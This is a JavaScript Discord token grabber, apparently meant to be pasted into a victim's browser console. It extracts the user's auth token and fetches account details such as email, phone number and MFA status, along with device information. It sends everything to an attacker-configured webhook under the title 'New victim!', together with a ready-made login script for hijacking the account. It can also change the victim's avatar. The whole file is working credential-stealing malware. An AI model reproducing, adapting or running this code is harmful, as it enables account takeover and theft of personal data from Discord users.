// settings
var webhook = "your webhook"
var changeAvatar = true // choose if you want to change the avatar
var newAvatar = "prefer using an image like: https://cdn.discordapp.com/avatars/958141688214343770/a_fcbf2a552f71b07f4f2dd138d32cbc5d.gif?size=1024 or bugs can happen";

// thanks for badges stanley-gf
var badgesList = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    }
};

// and uhhh shitty code
var token = (webpackChunkdiscord_app.push([
    [''], {},
    e => {
        m = [];
        for (let c in e.c) m.push(e.c[c])
    }
]), m).find(m => m ?.exports ?.default ?.getToken !== void 0).exports.default.getToken();
var infos = getInfos(token);

function sendWebhook(content) {
    var request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    request.send(JSON.stringify(content));
}

function getInfos(token) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "https://discordapp.com/api/v9/users/@me", false);
    xmlHttp.setRequestHeader("Authorization", token);
    xmlHttp.send(null);
    return JSON.parse(xmlHttp.responseText);
}

function getBadges(flags) {
    var badges = '';
    for (const lul in badgesList) {
        let lol = badgesList[lul];
        if ((flags & lol.Value) == lol.Value) badges += lol.Emoji;
    };
    if (badges == '') badges = `\`\`\`None\`\`\``;
    return badges;
}

function toDataURL(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function () {
        var reader = new FileReader();
        reader.onloadend = function () {
            callback(reader.result);
        }
        reader.readAsDataURL(xhr.response);
    };
    xhr.open('GET', url);
    xhr.responseType = 'blob';
    xhr.send();
}

function getNitro(flags) {
    if (flags === 0) {
        return "None";
    } else if (flags == 1) {
        return "Nitro Classic";
    } else if (flags == 2) {
        return "Nitro Boost";
    } else {
        return "None";
    }
}

function changeUser(token) {
    if (changeAvatar && newAvatar != "") {
        try {
        toDataURL(newAvatar, function (dataUrl) {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open("PATCH", "https://discordapp.com/api/v9/users/@me", false);
            xmlHttp.setRequestHeader("Authorization", token);
            xmlHttp.setRequestHeader("Content-Type", "application/json");
            xmlHttp.send(JSON.stringify({
                avatar: dataUrl
            }));
            if (xmlHttp.status != 200) {
                avatarError = true;
                avatarMessageError = xmlHttp.responseText
            } else {
                avatarError = false;
            }
        });
        } catch (e) {
            console.log(e);
            avatarError = true;
            avatarMessageError = JSON.stringify(
                {
                    error: e.message,
                    stack: e.stack
                }
            );
        }
        if (avatarError == false) {
            newInfos = getInfos(token);
            sendWebhook({
                "username": infos.username,
                "avatar_url": "https://avatars.githubusercontent.com/u/75091300?v=4",
                "embeds": [{
                    "title": "Avatar Changed",
                    "description": `\nAvatar changed successfully for user: __${infos.username}#${infos.discriminator}__\n**New link | [Click Me](https://cdn.discordapp.com/avatars/${infos.id}/${infos.avatar}?size=1024)**`,
                    "fields": [{
                        "name": "\nCopy Link",
                        "value": `\`\`\`https://cdn.discordapp.com/avatars/${infos.id}/${infos.avatar}?size=1024\`\`\``,
                    }],
                    "thumbnail": {
                        "url": newAvatar
                    },
                    "footer": {
                        "text": "Console Grabber by Mewzax",
                        "icon_url": "https://avatars.githubusercontent.com/u/75091300?v=4"
                    },
                    "author": {
                        "name": "Console Grabber",
                        "icon_url": "https://avatars.githubusercontent.com/u/75091300?v=4",
                    }
                }]
            });
        } else {
            sendWebhook({
                "username": infos.username,
                "avatar_url": "https://avatars.githubusercontent.com/u/75091300?v=4",
                "embeds": [{
                    "title": "Avatar Change Failed",
                    "description": "\nAvatar change failed for user: __" + infos.username + "__",
                    "thumbnail": {
                        "url": newAvatar
                    },
                    "footer": {
                        "text": "Console Grabber by Mewzax",
                        "icon_url": "https://avatars.githubusercontent.com/u/75091300?v=4"
                    },
                    "author": {
                        "name": "Console Grabber",
                        "icon_url": "https://avatars.githubusercontent.com/u/75091300?v=4",
                    },
                    fields: [{
                        "name": "Error",
                        "value": `Sorry :sob: but an error occured while trying to change the avatar.\n\n**Error Message**\n\`\`\`json
${avatarMessageError}\`\`\``
                    }],
                    "image": {
                        "url": "https://cdn.discordapp.com/attachments/958157013483946069/968193006823960636/e17c15c0cf0fd233b3845e77b13d678e.jpg"
                    }
                }]
            });
        }
}
}

var i = document.createElement('iframe');
document.body.appendChild(i);

try {
    json = JSON.parse(i.contentWindow.localStorage.deviceProperties)
    os = json.os;
    browser = json.browser;
    device = json.device;
    locale = json.locale;
} catch (e) {
    os = "Unknown";
    browser = "Unknown";
    device = "Unknown";
    locale = "Unknown";
}

var content = {
    username: infos.username,
    avatar_url: "https://avatars.githubusercontent.com/u/75091300?v=4",
    embeds: [{
        title: "New victim!",
        description: `**${infos.username}#${infos.discriminator}**'s Infos !`,

        fields: [{
                "name": "**Infos**",
                "value": `\`\`\`fix
ID: ${infos.id}\nEmail: ${infos.email}\nVerified: ${infos.verified}\nLanguage: ${infos.locale}\nPhone: ${infos.phone ? infos.phone : "None"}\nPhone Authentication: ${infos.mfa_enabled}\`\`\``
            },
            {
                "name": "**Computer**",
                "value": `\`\`\`toml
[os] ${os}\n[browser] ${browser}\n[device] ${device}\n[locale] ${locale}\`\`\``


            },
            {
                "name": "**Nitro**",
                "value": `\`\`\`${getNitro(infos.premium_type)}\`\`\``
            },
            {
                "name": "**Badges**",
                "value": `${getBadges(infos.public_flags)}`
            },
            {
                "name": "**Bio**",
                "value": `\`\`\`${infos.bio ? infos.bio : "None"}\`\`\``
            },
            {
                "name": "**Token**",
                "value": `\`\`\`yaml
${token}\`\`\``
            },
            {
                "name": "**Login Script**",
                "value": `\`\`\`js
location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = "\"${token}\""\`\`\``
            }
        ],
        image: {
            url: infos.banner ? `https://cdn.discordapp.com/banners/${infos.id}/${infos.banner}` : null
        },
        author: {
            name: "Console Grabber",
            icon_url: "https://avatars.githubusercontent.com/u/75091300?v=4",
        },
        thumbnail: {
            url: `https://cdn.discordapp.com/avatars/${infos.id}/${infos.avatar}?size=1024`
        },
        footer: {
            text: "Console Grabber by Mewzax",
            "icon_url": "https://avatars.githubusercontent.com/u/75091300?v=4"
        },
    }]
}
sendWebhook(content)
// i prefer wait for trying to change the avatar lul
setTimeout(() => {
    changeUser(token)
}, 1);